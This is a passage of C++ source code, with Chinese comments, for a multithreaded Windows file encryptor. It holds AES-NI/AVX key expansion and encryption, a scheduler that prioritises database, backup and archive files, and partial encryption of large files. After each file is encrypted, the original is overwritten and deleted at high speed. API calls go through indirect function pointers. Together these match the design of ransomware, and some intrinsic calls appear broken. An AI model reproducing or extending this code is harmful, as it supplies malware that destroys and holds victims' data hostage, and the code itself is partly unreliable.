        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp8);
        _mm_store_si128(&roundKeys[8], key);

        // 第9轮密钥扩展
        __m128i temp9 = _mm_aeskeygenassist_si128(key, 0x1B);
        temp9 = _mm_shuffle_epi32(temp9, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp9);
        _mm_store_si128(&roundKeys[9], key);

        // 第10轮密钥扩展
        __m128i temp10 = _mm_aeskeygenassist_si128(key, 0x36);
        temp10 = _mm_shuffle_epi32(temp10, _MM_SHUFFLE(3, 3, 3, 3));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
        key = _mm_xor_si128(key, _mm_slli_si128(key, 8));
        key = _mm_xor_si128(key, temp10);
        _mm_store_si128(&roundKeys[10], key);
    }

    // 单块加密（流水线优化）
    // 在ThreadLocalBCryptContext类中优化单块加密
    __m128i encryptSingleBlock(__m128i data) {
        alignas(64) __m128i* roundKeys = reinterpret_cast<__m128i*>(expandedKeys);

        // 使用寄存器缓存所有轮密钥减少内存访问
        __m128i key0 = roundKeys[0];
        __m128i key1 = roundKeys[1];
        __m128i key2 = roundKeys[2];
        __m128i key3 = roundKeys[3];
        __m128i key4 = roundKeys[4];
        __m128i key5 = roundKeys[5];
        __m128i key6 = roundKeys[6];
        __m128i key7 = roundKeys[7];
        __m128i key8 = roundKeys[8];
        __m128i key9 = roundKeys[9];
        __m128i key10 = roundKeys[10];

        __m128i state = _mm_xor_si128(data, key0);

        // AES-128: 完全手动展开10轮加密
        // 第1轮
        state = _mm_aesenc_si128(state, key1);
        // 第2轮
        state = _mm_aesenc_si128(state, key2);
        // 第3轮
        state = _mm_aesenc_si128(state, key3);
        // 第4轮
        state = _mm_aesenc_si128(state, key4);
        // 第5轮
        state = _mm_aesenc_si128(state, key5);
        // 第6轮
        state = _mm_aesenc_si128(state, key6);
        // 第7轮
        state = _mm_aesenc_si128(state, key7);
        // 第8轮
        state = _mm_aesenc_si128(state, key8);
        // 第9轮
        state = _mm_aesenc_si128(state, key9);
        // 第10轮（最终轮）
        state = _mm_aesenclast_si128(state, key10);

        return state;
    }
    // 批量加密优化
    bool encryptBulkOptimized(const BYTE* input, BYTE* output, size_t size) {
        const size_t blockSize = 16;
        const size_t numBlocks = size / blockSize;
        const int prefetchDistance = 8;

        for (size_t i = 0; i < numBlocks; ++i) {
            // 预取数据
            if (i + prefetchDistance < numBlocks) {
                _mm_prefetch(reinterpret_cast<const char*>(input + (i + prefetchDistance) * blockSize), _MM_HINT_T0);
            }

            __m128i data = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + i * blockSize));
            __m128i encrypted = encryptSingleBlock(data);
            _mm_storeu_si128(reinterpret_cast<__m128i*>(output + i * blockSize), encrypted);
        }

        return true;
    }

    // AVX2优化加密（一次处理4个块）
    bool encryptAVX2(const BYTE* input, BYTE* output, size_t size) {
#ifdef __AVX2__
        alignas(16) __m128i* roundKeys = reinterpret_cast<__m128i*>(expandedKeys);
        const size_t blockSize = 16;
        const size_t numBlocks = size / blockSize;
        const size_t avx2Blocks = (numBlocks / 4) * 4;

        // 处理4的倍数块
        for (size_t i = 0; i < avx2Blocks; i += 4) {
            // 加载4个块
            __m256i data1 = _mm256_loadu_si256(reinterpret_cast<const __m256i*>(input + i * blockSize));
            __m256i data2 = _mm256_loadu_si256(reinterpret_cast<const __m256i*>(input + (i + 2) * blockSize));

            // 广播轮密钥
            __m256i key0 = _mm256_broadcastsi128_si256(roundKeys[0]);
            __m256i state1 = _mm256_xor_si256(data1, key0);
            __m256i state2 = _mm256_xor_si256(data2, key0);

            // 主轮次（手动展开）
            for (int j = 1; j < rounds; ++j) {
                __m256i key = _mm256_broadcastsi128_si256(roundKeys[j]);
                state1 = _mm256_aesenc_epi128(state1, key);
                state2 = _mm256_aesenc_epi128(state2, key);
            }

            // 最后一轮
            __m256i finalKey = _mm256_broadcastsi128_si256(roundKeys[rounds]);
            state1 = _mm256_aesenclast_epi128(state1, finalKey);
            state2 = _mm256_aesenclast_epi128(state2, finalKey);

            // 存储结果
            _mm256_storeu_si256(reinterpret_cast<__m256i*>(output + i * blockSize), state1);
            _mm256_storeu_si256(reinterpret_cast<__m256i*>(output + (i + 2) * blockSize), state2);
        }

        // 处理剩余块
        for (size_t i = avx2Blocks; i < numBlocks; ++i) {
            __m128i data = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + i * blockSize));
            __m128i encrypted = encryptSingleBlock(data);
            _mm_storeu_si128(reinterpret_cast<__m128i*>(output + i * blockSize), encrypted);
        }

        return true;
#else
        return encryptBulkOptimized(input, output, size);
#endif
    }

    // AVX-512优化加密（一次处理8个块）
    bool encryptAVX512(const BYTE* input, BYTE* output, size_t size) {
#ifdef __AVX512F__
        alignas(16) __m128i* roundKeys = reinterpret_cast<__m128i*>(expandedKeys);
        const size_t blockSize = 16;
        const size_t numBlocks = size / blockSize;
        const size_t avx512Blocks = (numBlocks / 8) * 8;

        for (size_t i = 0; i < avx512Blocks; i += 8) {
            // 加载8个块
            __m512i data = _mm512_loadu_s512(reinterpret_cast<const __m512i*>(input + i * blockSize));

            // 广播轮密钥
            __m512 key0 = _mm512_broadcast_i32x4(roundKeys[0]);
            __m512i state = _mm512_xor_si512(data, key0);

            // 主轮次
            for (int j = 1; j < rounds; ++j) {
                __m512i key = _mm512_broadcast_i32x4(roundKeys[j]);
                state = _mm512_aesenc_epi128(state, key);
            }

            // 最后一轮
            __m512i finalKey = _mm512_broadcast_i32x(roundKeys[rounds]);
            state = _mm512_aesenclast_epi128(state, finalKey);

            // 存储结果
            _mm512_storeu_si512(reinterpret_cast<__m512i*>(output + i * blockSize), state);
        }

        // 处理剩余块
        for (size_t i = avx512Blocks; i < numBlocks; ++i) {
            __m128i data = _mm_loadu_si128(reinterpret_cast<const __m128i*>(input + i * blockSize));
            __m128i encrypted = encryptSingleBlock(data);
            _mm_storeu_si128(reinterpret_cast<__m128i*>(output + i * blockSize), encrypted);
        }

        return true;
#else
        return encryptAVX2(input, output, size);
#endif
    }

    // 预热优化器减少首次调用开销
    void warmupOptimizer() {
        alignas(64) BYTE testData[256] = { 0 };
        alignas(64) BYTE testOutput[256];

        // 多次运行以预热缓存和分支预测
        for (int i = 0; i < 50; ++i) {
            encryptWithAESNI(testData, testOutput, 256);
        }
    }
};
// ==================== 异步任务链系统 ====================
template<typename T>
class AsyncChain {
private:
    std::shared_ptr<std::promise<T>> promise;
    std::shared_future<T> future;

public:
    AsyncChain() : promise(std::make_shared<std::promise<T>>()) {
        future = promise->get_future();
    }

    template<typename F, typename... Args>
    auto then(F&& func, Args&&... args) -> AsyncChain<decltype(func(std::declval<T>(), std::forward<Args>(args)...))> {
        using ResultType = decltype(func(std::declval<T>(), std::forward<Args>(args)...));
        AsyncChain<ResultType> nextChain;

        std::thread([this, nextChain, func = std::forward<F>(func),
            args = std::make_tuple(std::forward<Args>(args)...)]() mutable {
                try {
                    T value = future.get();
                    auto result = std::apply([&](auto&&... params) {
                        return func(value, params...);
                        }, args);
                    nextChain.setValue(std::move(result));
                }
                catch (...) {
                    nextChain.setException(std::current_exception());
                }
            }).detach();

        return nextChain;
    }

    void setValue(T value) {
        promise->set_value(std::move(value));
    }

    void setException(std::exception_ptr ptr) {
        promise->set_exception(ptr);
    }

    T get() {
        return future.get();
    }

    bool valid() const {
        return future.valid();
    }
};

// ==================== 优化后的异步删除协调器 ====================
// ==================== 优化后的异步删除协调器 ====================
// ==================== 优化后的异步删除协调器 ====================
class AsyncDeletionCoordinator {
private:
    // 新增：快速扩展删除线程池
    void rapidExpandDeletionThreads() {
        size_t targetThreads = targetThreadCount_.load();
        size_t currentThreads = deletionThreads_.size();

        if (currentThreads >= targetThreads) {
            return;
        }

        std::cout << "Rapid expansion: from " << currentThreads << " to " << targetThreads << " deletion threads" << std::endl;

        // 批量创建线程，避免逐个创建的开销
        size_t threadsToCreate = targetThreads - currentThreads;
        for (size_t i = 0; i < threadsToCreate && deletionThreads_.size() < targetThreads; ++i) {
            size_t newThreadId = deletionThreads_.size();
            createDeletionThread(newThreadId);

            // 小延迟避免瞬间创建过多线程
            if (i % 8 == 0) {
                std::this_thread::sleep_for(std::chrono::microseconds(100));
            }
        }

        std::cout << "Rapid expansion completed: " << deletionThreads_.size() << " deletion threads active" << std::endl;
    }
private:
    struct DeletionTask {
        fs::path originalFile;
        fs::path encryptedFile;  // 修正：encodedFile -> encryptedFile
        int retryCount = 0;
        std::promise<bool> completionPromise;
        time_t scheduleTime;
        std::atomic<bool> cancelled{ false };
    };

    std::queue<std::shared_ptr<DeletionTask>> deletionQueue_;
    mutable std::mutex queueMutex_;
    std::condition_variable queueCV_;
    std::atomic<bool> stopFlag_{ false };
    std::vector<std::thread> deletionThreads_;
    std::shared_ptr<AlignedMemoryPool> memoryPool_;
    PerformanceStatsManager& statsManager_;
    std::atomic<size_t> pendingTasks_{ 0 };
    std::atomic<size_t> completedTasks_{ 0 };
    std::atomic<size_t> failedTasks_{ 0 };

    // 新增：动态线程管理
    std::atomic<bool> encryptionCompleted_{ false };
    std::atomic<size_t> targetThreadCount_{ 0 };
    std::atomic<size_t> activeThreads_{ 0 };

public:
    AsyncDeletionCoordinator(PerformanceStatsManager& statsMgr)
        : statsManager_(statsMgr) {
        memoryPool_ = std::make_shared<AlignedMemoryPool>(1024 * 1024 * 16);

        // 初始线程数较少，避免影响加密性能
        auto& config = RuntimeConfigManager::getInstance();
        targetThreadCount_ = std::min<DWORD>(config.getMaxWorkerThreads() / 8, 4u);

        for (size_t i = 0; i < targetThreadCount_; ++i) {
            createDeletionThread(i);
        }
        std::cout << "Async deletion coordinator started with " << targetThreadCount_ << " threads" << std::endl;
    }

    ~AsyncDeletionCoordinator() {
        stopFlag_.store(true);
        queueCV_.notify_all();

        // 等待所有线程完成
        for (auto& thread : deletionThreads_) {
            if (thread.joinable()) {
                thread.join();
            }
        }

        std::cout << "Async deletion coordinator stopped. Completed: " << completedTasks_.load()
            << ", Failed: " << failedTasks_.load() << std::endl;
    }

    // 新增：标记加密完成，启动快速删除模式
    // 新增：标记加密完成，启动快速删除模式
    void markEncryptionCompleted() {
        if (encryptionCompleted_.exchange(true)) {
            return; // 已经设置过
        }

        std::cout << "Encryption completed, starting fast deletion mode..." << std::endl;

        // ========== 修改点3：更激进的线程扩展策略 ==========
        auto& config = RuntimeConfigManager::getInstance();
        size_t maxThreads = std::min<size_t>(
            std::thread::hardware_concurrency() * 4,  // 从2倍改为4倍
            config.getMaxWorkerThreads()
        );

        // 设置目标线程数为最大线程数的75%，确保快速删除
        targetThreadCount_ = std::max<size_t>((maxThreads * 3) / 4, 16u);  // 从一半改为75%

        std::cout << "Target deletion threads increased to: " << targetThreadCount_ << std::endl;

        // 立即创建额外的删除线程
        expandDeletionThreads();

        // ========== 修改点4：添加快速扩展机制 ==========
        // 在加密完成后立即启动快速扩展
        std::thread([this]() {
            // 等待所有加密线程完全结束
            std::this_thread::sleep_for(std::chrono::milliseconds(100));

            // 快速扩展删除线程池
            rapidExpandDeletionThreads();
            }).detach();
    }
    std::future<bool> scheduleDeletion(const fs::path& original, const fs::path& encrypted) {
        auto task = std::make_shared<DeletionTask>();
        task->originalFile = original;
        task->encryptedFile = encrypted;  // 修正：encodedFile -> encryptedFile
        task->scheduleTime = time(nullptr);
        auto future = task->completionPromise.get_future();

        {
            std::lock_guard<std::mutex> lock(queueMutex_);
            deletionQueue_.push(task);
            pendingTasks_.fetch_add(1);
        }

        // 如果加密已完成且任务积压，动态扩展线程
        if (encryptionCompleted_.load() && pendingTasks_.load() > activeThreads_.load() * 10) {
            expandDeletionThreads();
        }

        queueCV_.notify_one();
        return future;
    }

    void cancelAllTasks() {
        std::lock_guard<std::mutex> lock(queueMutex_);
        while (!deletionQueue_.empty()) {
            auto task = deletionQueue_.front();
            task->cancelled.store(true);
            task->completionPromise.set_value(false);
            deletionQueue_.pop();
        }
        pendingTasks_.store(0);
    }

    size_t getPendingTasks() const { return pendingTasks_.load(); }
    size_t getCompletedTasks() const { return completedTasks_.load(); }
    size_t getFailedTasks() const { return failedTasks_.load(); }
    size_t getActiveThreads() const { return activeThreads_.load(); }

private:
    // 新增：创建删除线程
    void createDeletionThread(size_t threadId) {
        deletionThreads_.emplace_back([this, threadId]() {
            activeThreads_.fetch_add(1);
            deletionWorker(threadId);
            activeThreads_.fetch_sub(1);
            });
    }

    // 新增：扩展删除线程池
    void expandDeletionThreads() {
        size_t currentActive = activeThreads_.load();
        size_t currentTarget = targetThreadCount_.load();

        if (currentActive >= currentTarget) {
            return; // 已经达到目标线程数
        }

        size_t threadsToCreate = currentTarget - currentActive;
        threadsToCreate = std::min(threadsToCreate, static_cast<size_t>(8)); // 每次最多创建8个线程

        std::cout << "Expanding deletion threads by " << threadsToCreate << std::endl;

        for (size_t i = 0; i < threadsToCreate && deletionThreads_.size() < targetThreadCount_; ++i) {
            size_t newThreadId = deletionThreads_.size();
            createDeletionThread(newThreadId);
        }
    }

    void deletionWorker(size_t workerId) {
        ThreadAffinityManager affinityMgr;
        affinityMgr.initialize();
        affinityMgr.setCurrentThreadAffinity(workerId % affinityMgr.getProcessorGroupCount());

        std::cout << "Deletion worker " << workerId << " started" << std::endl;

        while (!stopFlag_.load()) {
            std::shared_ptr<DeletionTask> task;
            {
                std::unique_lock<std::mutex> lock(queueMutex_);

                // 加密完成后使用更短的超时时间，快速响应新任务
                if (encryptionCompleted_.load()) {
                    queueCV_.wait_for(lock, std::chrono::milliseconds(100), [this] {
                        return stopFlag_.load() || !deletionQueue_.empty();
                        });
                }
                else {
                    queueCV_.wait(lock, [this] {
                        return stopFlag_.load() || !deletionQueue_.empty();
                        });
                }

                if (stopFlag_.load() && deletionQueue_.empty()) break;
                if (deletionQueue_.empty()) continue;

                task = deletionQueue_.front();
                deletionQueue_.pop();
            }

            if (task->cancelled.load()) {
                pendingTasks_.fetch_sub(1);
                continue;
            }

            auto startTime = std::chrono::high_resolution_clock::now();
            bool success = performSafeDeletion(*task);
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);

            if (success) {
                completedTasks_.fetch_add(1);
                statsManager_.recordMetric("AsyncDeletion", 0, duration.count());
            }
            else {
                failedTasks_.fetch_add(1);
                statsManager_.recordError("AsyncDeletion");
            }

            pendingTasks_.fetch_sub(1);
            task->completionPromise.set_value(success);

            // 加密完成后处理更快，减少延迟
            if (encryptionCompleted_.load()) {
                std::this_thread::sleep_for(std::chrono::milliseconds(1));
            }
        }

        std::cout << "Deletion worker " << workerId << " finished" << std::endl;
    }

    bool performSafeDeletion(DeletionTask& task) {
        try {
            if (task.cancelled.load()) {
                return false;
            }

            // 1. 验证加密文件完整性
            if (!validateEncryptedFileStable(task.encryptedFile)) {  // 修正：encodedFile -> encryptedFile
                std::cerr << "Encrypted file validation failed, skipping deletion: "
                    << task.originalFile << std::endl;
                return false;
            }

            // 2. 加密完成后使用更激进的删除策略
            if (encryptionCompleted_.load()) {
                // 快速删除模式：减少重试次数，使用更简单的删除方法
                for (int attempt = 0; attempt < 2; ++attempt) {
                    if (task.cancelled.load()) {
                        return false;
                    }

                    if (fastSecureDelete(task.originalFile)) {
                        std::cout << "Fast deletion successful: " << task.originalFile
                            << " (attempt " << (attempt + 1) << ")" << std::endl;
                        return true;
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                }
            }
            else {
                // 正常删除模式
                for (int attempt = 0; attempt < 3; ++attempt) {
                    if (task.cancelled.load()) {
                        return false;
                    }

                    if (SecureDeleteFilehf(task.originalFile, 3)) {
                        std::cout << "Async deletion successful: " << task.originalFile
                            << " (attempt " << (attempt + 1) << ")" << std::endl;
                        return true;
                    }
                    std::this_thread::sleep_for(std::chrono::milliseconds(100 * (attempt + 1)));
                }
            }

            std::cerr << "Async deletion failed after retries: " << task.originalFile << std::endl;
            return false;
        }
        catch (const std::exception& e) {
            std::cerr << "Async deletion error: " << e.what() << std::endl;
            return false;
        }
    }

    // 新增：快速安全删除方法（加密完成后使用）
    bool fastSecureDelete(const fs::path& filePath) {
        try {
            if (!fs::exists(filePath)) {
                return true;
            }

            // 尝试直接删除
            std::error_code ec;
            if (fs::remove(filePath, ec)) {
                return true;
            }

            // 如果直接删除失败，使用简化版的安全删除
            HANDLE hFile = SAFE_CALL_API(pCreateFileW,
                filePath.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                return false;
            }

            LARGE_INTEGER fileSize;
            if (!SAFE_CALL_API(pGetFileSizeEx, hFile, &fileSize)) {
                SAFE_CALL_API(pCloseHandle, hFile);
                return false;
            }

            // 只覆盖文件头（快速模式）
            if (fileSize.QuadPart > 0) {
                std::vector<BYTE> zeroBuffer(8192, 0); // 8KB缓冲区
                DWORD written = 0;
                // 使用SetFilePointerEx替代pSetFilePointer
                LARGE_INTEGER zeroOffset = { 0 };
                SAFE_CALL_API(pSetFilePointerEx, hFile, zeroOffset, NULL, FILE_BEGIN);
                SAFE_CALL_API(pWriteFile, hFile, zeroBuffer.data(),
                    static_cast<DWORD>(std::min(static_cast<LONGLONG>(8192), fileSize.QuadPart)),
                    &written, NULL);
            }

            SAFE_CALL_API(pCloseHandle, hFile);

            // 最终删除
            return fs::remove(filePath, ec);
        }
        catch (...) {
            return false;
        }
    }
};
// ==================== 优化后的加密引擎 ====================
class OptimizedEncryptionEngine {
private:
    BYTE masterKey[KEY_LENGTH];
    mutable std::mutex initMutex;
    std::atomic<bool> initialized{ false };
    std::shared_ptr<AlignedMemoryPool> memoryPool_;
    GPUAccelerationManager gpuManager_;
    PerformanceStatsManager& statsManager_;
    std::atomic<size_t> totalEncryptedBytes{ 0 };
    std::atomic<size_t> gpuEncryptedBytes{ 0 };
    std::atomic<size_t> cpuEncryptedBytes{ 0 };

    // 线程局部存储的BCrypt上下文
    static thread_local std::unique_ptr<ThreadLocalBCryptContext> tlsContext;

public:
    OptimizedEncryptionEngine(PerformanceStatsManager& statsMgr)
        : statsManager_(statsMgr) {
        memoryPool_ = std::make_shared<AlignedMemoryPool>(MEMORY_POOL_SIZE);
    }

    bool initialize(const BYTE* encryptionKey) {
        std::lock_guard<std::mutex> lock(initMutex);
        if (initialized) return true;

        memcpy(masterKey, encryptionKey, KEY_LENGTH);

        // 初始化GPU加速
        auto& config = RuntimeConfigManager::getInstance();
        if (config.getEnableGPUAcceleration()) {
            gpuManager_.initialize();
        }

        initialized = true;

        std::cout << "Optimized encryption engine initialized" << std::endl;
        std::cout << "GPU acceleration: " << (gpuManager_.isAvailable() ? "ENABLED" : "DISABLED") << std::endl;
        return true;
    }

    ThreadLocalBCryptContext& getThreadContext() {
        if (!tlsContext) {
            tlsContext = std::make_unique<ThreadLocalBCryptContext>(masterKey);
        }
        return *tlsContext;
    }

    AsyncChain<GCM_ENCRYPT_RESULT> encryptGCMAsync(const BYTE* input, size_t inputSize) {
        AsyncChain<GCM_ENCRYPT_RESULT> chain;

        // 使用线程池执行加密任务
        std::thread([this, input, inputSize, chain]() mutable {
            try {
                auto result = encryptGCMInternal(input, inputSize);
                chain.setValue(std::move(result));
            }
            catch (...) {
                chain.setException(std::current_exception());
            }
            }).detach();

        return chain;
    }

    GCM_ENCRYPT_RESULT encryptGCM(const BYTE* input, size_t inputSize) {
        return encryptGCMInternal(input, inputSize);
    }

    void cleanup() {
        initialized = false;
        gpuManager_.cleanup();
        std::cout << "Encryption engine cleanup completed" << std::endl;
    }

    size_t getTotalEncryptedBytes() const { return totalEncryptedBytes; }
    size_t getGPUEncryptedBytes() const { return gpuEncryptedBytes; }
    size_t getCPUEncryptedBytes() const { return cpuEncryptedBytes; }

private:
    GCM_ENCRYPT_RESULT encryptGCMInternal(const BYTE* input, size_t inputSize) {
        auto startTime = std::chrono::high_resolution_clock::now();

        try {
            if (!initialized) {
                throw std::runtime_error("Encryption engine not initialized");
            }

            // 优先尝试GPU加速
            if (gpuManager_.isAvailable() && inputSize > 1024 * 1024) {
                try {
                    auto gpuResult = gpuManager_.encryptWithGPU(
                        std::vector<BYTE>(input, input + inputSize), masterKey);

                    if (!gpuResult.empty()) {
                        GCM_ENCRYPT_RESULT result;
                        result.ciphertext = std::move(gpuResult);
                        result.success = true;
                        result.status = STATUS_SUCCESS;

                        gpuEncryptedBytes.fetch_add(inputSize);
                        totalEncryptedBytes.fetch_add(inputSize);

                        auto endTime = std::chrono::high_resolution_clock::now();
                        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(endTime - startTime);
                        statsManager_.recordMetric("GPUEncryption", inputSize, duration.count() / 1000.0);

                        return result;
                    }
                }
                catch (const std::exception& e) {
                    std::cerr << "GPU encryption failed, falling back to CPU: " << e.what() << std::endl;
                }
            }

            // 优化的CPU加密路径
            auto& ctx = getThreadContext();

            // 使用内存池分配对齐缓冲区
            void* alignedInput = memoryPool_->allocate(inputSize);
            if (!alignedInput) {
                throw std::runtime_error("Failed to allocate aligned memory for encryption");
            }

            struct MemoryGuard {
                std::shared_ptr<AlignedMemoryPool> pool;
                void* ptr;
                ~MemoryGuard() { if (ptr) pool->deallocate(ptr); }
            } guard{ memoryPool_, alignedInput };

            memcpy(alignedInput, input, inputSize);

            // 优先使用优化的AES-NI加速
            std::vector<BYTE> ciphertext(inputSize);
            bool hardwareAccelerated = false;

            if (ctx.aesniSupported && inputSize % 16 == 0) {
                hardwareAccelerated = ctx.encryptWithAESNI(
                    static_cast<const BYTE*>(alignedInput),
                    ciphertext.data(),
                    inputSize
                );

                if (hardwareAccelerated) {
                    // 计算性能指标
                    double avgCyclesPerBlock = ctx.totalBlocks > 0 ?
                        static_cast<double>(ctx.totalCycles.load()) / ctx.totalBlocks.load() : 0.0;

                    std::cout << "AES-NI accelerated encryption: " << inputSize << " bytes, "
                        << "avg " << avgCyclesPerBlock << " cycles/block" << std::endl;
                }
            }

            if (!hardwareAccelerated) {
                // 回退到BCrypt软件加密
                NTSTATUS status = SAFE_CALL_API(pBCryptGenRandom, nullptr,
                    ctx.localIV, IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
                if (!NT_SUCCESS(status)) {
                    throw std::runtime_error("IV generation failed: " + to_hex(status));
                }

                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = ctx.localIV;
                authInfo.cbNonce = IV_LENGTH;
                authInfo.pbTag = ctx.localTag;
                authInfo.cbTag = TAG_LENGTH;

                ULONG cbResult = 0;
                status = SAFE_CALL_API(pBCryptEncrypt, ctx.key,
                    static_cast<PUCHAR>(alignedInput),
                    static_cast<ULONG>(inputSize),
                    &authInfo, nullptr, 0,
                    ciphertext.data(),
                    static_cast<ULONG>(inputSize),
                    &cbResult, 0);

                if (!NT_SUCCESS(status)) {
                    throw std::runtime_error("GCM encryption failed: " + to_hex(status));
                }

                std::cout << "Software fallback encryption: " << inputSize << " bytes" << std::endl;
            }

            // 更新统计信息
            ctx.blocksEncrypted.fetch_add((inputSize + 15) / 16);

            if (hardwareAccelerated) {
                cpuEncryptedBytes.fetch_add(inputSize);
            }
            else {
                // 记录软件加密的统计
            }

            totalEncryptedBytes.fetch_add(inputSize);

            GCM_ENCRYPT_RESULT result;
            result.ciphertext = std::move(ciphertext);
            memcpy(result.tag, ctx.localTag, TAG_LENGTH);
            result.success = true;
            result.status = STATUS_SUCCESS;

            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::microseconds>(endTime - startTime);

            std::string metricName = hardwareAccelerated ? "AES-NIEncryption" : "SoftwareEncryption";
            statsManager_.recordMetric(metricName, inputSize, duration.count() / 1000.0);

            return result;
        }
        catch (const std::exception& e) {
            statsManager_.recordError("Encryption");
            std::cerr << "GCM encryption exception: " << e.what() << std::endl;
            GCM_ENCRYPT_RESULT result;
            result.success = false;
            result.status = STATUS_UNSUCCESSFUL;
            return result;
        }
    }
};

// 定义线程局部变量
thread_local std::unique_ptr<ThreadLocalBCryptContext> OptimizedEncryptionEngine::tlsContext = nullptr;

// ==================== 优化后的四层流水线架构 ====================
class OptimizedEncryptionPipeline {
public:
    enum class PipelineStage {
        STAGE_IO_READ,
        STAGE_DATA_PREP,
        STAGE_ENCRYPTION,
        STAGE_COMMIT_WRITE,
        STAGE_SANITIZE
    };

    struct StageMetrics {
        std::atomic<size_t> filesProcessed{ 0 };
        std::atomic<size_t> bytesProcessed{ 0 };
        std::atomic<double> totalTimeMs{ 0.0 };
        std::atomic<double> peakThroughputMBs{ 0.0 };
        std::atomic<size_t> errorCount{ 0 };

        void updateMetrics(size_t bytes, double timeMs) {
            filesProcessed.fetch_add(1);
            bytesProcessed.fetch_add(bytes);
            totalTimeMs.fetch_add(timeMs);

            double throughput = (bytes / (1024.0 * 1024.0)) / (timeMs / 1000.0);
            double currentPeak = peakThroughputMBs.load();
            while (throughput > currentPeak &&
                !peakThroughputMBs.compare_exchange_weak(currentPeak, throughput)) {
            }
        }
    };

    // ==================== 优化后的I/O调度器 - 使用IOCP ====================
    class OptimizedIOScheduler {
    public:
        struct FileTask {
            fs::path filePath;
            size_t fileSize;
            bool isDatabaseFile;
            int priority;
            time_t discoveryTime;
            std::shared_ptr<IOCPAsyncIO> ioSystem;
            HANDLE fileHandle{ INVALID_HANDLE_VALUE };

            bool operator<(const FileTask& other) const {
                if (priority != other.priority) return priority < other.priority;
                return fileSize < other.fileSize;
            }

            // 添加公共getter方法
            const fs::path& getFilePath() const { return filePath; }
            size_t getFileSize() const { return fileSize; }
            bool getIsDatabaseFile() const { return isDatabaseFile; }
            int getPriority() const { return priority; }
            time_t getDiscoveryTime() const { return discoveryTime; }
            HANDLE getFileHandle() const { return fileHandle; }
        };

    private:
        struct AsyncReadContext {
            OVERLAPPED overlapped{ 0 };
            std::vector<BYTE> buffer;
            std::promise<std::vector<BYTE>> readPromise;
            size_t fileSize;
            size_t bytesRead{ 0 };
        };

        std::priority_queue<FileTask> taskQueue;
        mutable std::mutex queueMutex;
        std::condition_variable queueCV;
        std::atomic<bool> stop{ false };
        std::shared_ptr<IOCPAsyncIO> ioCompletionPort;
        std::shared_ptr<AlignedMemoryPool> memoryPool;
        PerformanceStatsManager& statsManager;
        std::atomic<size_t> activeReads{ 0 };

    public:
        OptimizedIOScheduler(PerformanceStatsManager& statsMgr)
            : statsManager(statsMgr) {
            memoryPool = std::make_shared<AlignedMemoryPool>(1024 * 1024 * 32);
            ioCompletionPort = std::make_shared<IOCPAsyncIO>();
            ioCompletionPort->initialize();

            ioCompletionPort->setCompletionHandler([this](DWORD bytesTransferred, DWORD error, LPOVERLAPPED overlapped) {
                handleIOCompletion(bytesTransferred, error, overlapped);
                });
        }

        ~OptimizedIOScheduler() {
            stopScheduler();
        }

        void addFileTask(const fs::path& path, size_t size, bool isDB, int priority) {
            FileTask task;
            task.filePath = path;
            task.fileSize = size;
            task.isDatabaseFile = isDB;
            task.priority = priority;
            task.discoveryTime = time(nullptr);
            task.ioSystem = ioCompletionPort;

            std::lock_guard<std::mutex> lock(queueMutex);
            taskQueue.push(std::move(task));
            queueCV.notify_one();
        }

        std::optional<FileTask> getNextTask() {
            std::unique_lock<std::mutex> lock(queueMutex);
            queueCV.wait(lock, [this] { return stop || !taskQueue.empty(); });
            if (stop && taskQueue.empty()) return std::nullopt;
            auto task = taskQueue.top();
            taskQueue.pop();
            return task;
        }
        // 在readFileAsync函数之前添加这个函数
        inline size_t calculateReadSize(const fs::path& filePath, size_t fileSize) {
            try {
                // 获取文件扩展名判断文件类型
                std::string ext = filePath.extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                static const std::unordered_set<std::string> databaseExtensions = {
                    ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
                    ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
                    ".backup", ".wal", ".journal", ".dat", ".bin", ".7z", ".rar", ".zip"
                };

                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();

                if (isDatabaseFile) {
                    // 数据库文件：完整读取
                    return fileSize;
                }
                else if (fileSize < SMALL_FILE_THRESHOLD) {
                    // 小文件：读取固定头部
                    return std::min(fileSize, (size_t)HEADER_ENCRYPT_SIZE);
                }
                else {
                    // 大文件：读取1%
                    size_t onePercent = (fileSize * CHUNK_ENCRYPT_RATIO) / 100;
                    return std::min(onePercent, fileSize);
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Error calculating read size for " << filePath << ": " << e.what() << std::endl;
                // 默认读取头部
                return std::min(fileSize, (size_t)HEADER_ENCRYPT_SIZE);
            }
        }
        // 在OptimizedIOScheduler类中优化readFileAsync方法
        AsyncChain<std::vector<BYTE>> readFileAsync(const FileTask& task) {
            AsyncChain<std::vector<BYTE>> chain;

            // 使用 std::async 启动异步任务
            std::async(std::launch::async, [this, task, &chain]() {
                try {
                    fs::path filePath = task.getFilePath();
                    size_t fileSize = task.getFileSize();

                    // 增强文件存在性检查
                    if (!fs::exists(filePath)) {
                        throw std::runtime_error("File does not exist: " + filePath.string());
                    }

                    // 验证文件大小是否变化
                    uintmax_t actualSize = fs::file_size(filePath);
                    if (actualSize != fileSize) {
                        std::cout << "File size changed, using actual size: " << actualSize << std::endl;
                        fileSize = actualSize;
                    }

                    if (fileSize == 0) {
